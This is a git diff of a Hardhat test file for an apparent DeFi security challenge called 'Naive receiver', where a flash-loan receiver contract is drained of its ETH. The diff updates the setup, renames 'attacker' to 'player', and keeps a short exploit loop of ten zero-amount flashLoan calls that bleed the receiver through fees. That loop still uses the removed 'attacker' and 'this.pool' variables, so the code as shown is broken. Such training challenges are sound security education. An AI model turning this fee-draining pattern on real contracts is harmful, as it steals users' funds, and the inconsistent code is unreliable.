@@ -2,17 +2,18 @@ const { ethers } = require("hardhat");
 const { expect } = require("chai");
 
 describe("[Challenge] Naive receiver", function () {
-  let deployer, user, attacker;
+  let deployer, user, player;
+  let pool, receiver;
 
   // Pool has 1000 ETH in balance
-  const ETHER_IN_POOL = ethers.utils.parseEther("1000");
+  const ETHER_IN_POOL = 1000n * 10n ** 18n;
 
   // Receiver has 10 ETH in balance
-  const ETHER_IN_RECEIVER = ethers.utils.parseEther("10");
+  const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
 
   before(async function () {
     /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-    [deployer, user, attacker] = await ethers.getSigners();
+    [deployer, user, player] = await ethers.getSigners();
 
     const LenderPoolFactory = await ethers.getContractFactory(
       "NaiveReceiverLenderPool",
@@ -23,32 +24,37 @@ describe("[Challenge] Naive receiver", function () {
       deployer
     );
 
-    this.pool = await LenderPoolFactory.deploy();
-    await deployer.sendTransaction({
-      to: this.pool.address,
-      value: ETHER_IN_POOL,
-    });
+    pool = await LenderPoolFactory.deploy();
+    await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
+    const ETH = await pool.ETH();
 
-    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
+    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(
       ETHER_IN_POOL
     );
-    expect(await this.pool.fixedFee()).to.be.equal(
-      ethers.utils.parseEther("1")
-    );
+    expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
+    expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
 
-    this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+    receiver = await FlashLoanReceiverFactory.deploy(pool.address);
     await deployer.sendTransaction({
-      to: this.receiver.address,
+      to: receiver.address,
       value: ETHER_IN_RECEIVER,
     });
-
-    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
+    await expect(
+      receiver.onFlashLoan(
+        deployer.address,
+        ETH,
+        ETHER_IN_RECEIVER,
+        10n ** 18n,
+        "0x"
+      )
+    ).to.be.reverted;
+    expect(await ethers.provider.getBalance(receiver.address)).to.eq(
       ETHER_IN_RECEIVER
     );
   });
 
-  it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE */
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
     console.log("attacker address is: ", attacker.address);
     for (let i = 0; i < 10; i++) {
       await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
@@ -56,14 +62,12 @@ describe("[Challenge] Naive receiver", function () {
   });
 
   after(async function () {
-    /** SUCCESS CONDITIONS */
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
     // All ETH has been drained from the receiver
-    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
-      "0"
-    );
-    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
-      ETHER_IN_POOL.add(ETHER_IN_RECEIVER)
+    expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(0);
+    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(
+      ETHER_IN_POOL + ETHER_IN_RECEIVER
     );
   });
 });
